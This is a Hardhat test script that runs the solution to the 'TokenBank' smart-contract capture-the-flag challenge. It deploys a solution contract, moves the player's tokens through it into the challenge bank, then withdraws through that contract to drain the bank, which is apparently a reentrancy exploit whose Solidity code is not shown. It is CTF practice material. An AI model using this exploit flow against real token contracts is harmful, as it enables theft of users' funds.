const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0xc1e022B94f61F453D3d0F2BE80B8697c9AEe880f";

before(async () => {
  accounts = await ethers.getSigners();
  player = accounts[0];
});

it("TokenBank", async function () {
  const chFactory = await ethers.getContractFactory("TokenBankChallenge");
  const chContract = await chFactory.attach(CHALLENGE_ADDRESS);
  const tokenAddress = await chContract.token();
  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  const tokenContract = await tokenFactory.attach(tokenAddress);

  const solFactory = await ethers.getContractFactory("TokenBankSolution");
  console.log("deploying sol contract..");
  const solContract = await solFactory.deploy(
    chContract.address,
    tokenAddress,
    { gasLimit: 6e6 }
  );
  console.log(solContract.address);
  await solContract.deployed();
  console.log("sol contract deployed");

  const PLAYER_BALANCE = await chContract.balanceOf(player.address);

  expect(await tokenContract.balanceOf(player.address)).to.eq(0);

  tx = await chContract.withdraw(PLAYER_BALANCE, { gasLimit: 6e6 });
  console.log("withdraw intitiated");
  await tx.wait();
  console.log("withdraw completed");

  expect(await tokenContract.balanceOf(player.address)).to.eq(PLAYER_BALANCE);
  expect(await tokenContract.balanceOf(solContract.address)).to.eq(0);

  tx = await tokenContract["transfer(address,uint256)"](
    solContract.address,
    PLAYER_BALANCE
  );
  console.log("token transfer intitiated");
  await tx.wait();
  console.log("token transfer completed");

  expect(await tokenContract.balanceOf(solContract.address)).to.eq(
    PLAYER_BALANCE
  );
  expect(await chContract.balanceOf(solContract.address)).to.eq(0);

  tx = await solContract.transferToBank(PLAYER_BALANCE, { gasLimit: 6e6 });
  console.log("transfer to bank intitiated");
  await tx.wait();
  console.log("transfer to bank completed");

  expect(await chContract.balanceOf(solContract.address)).to.eq(PLAYER_BALANCE);

  tx = await solContract.withdrawFromBank(PLAYER_BALANCE, { gasLimit: 6e6 });
  console.log("withdraw from bank intitiated");
  await tx.wait();
  console.log("transfer from bank completed");

  const isComplete = await chContract.isComplete();
  expect(isComplete).to.be.true;
});
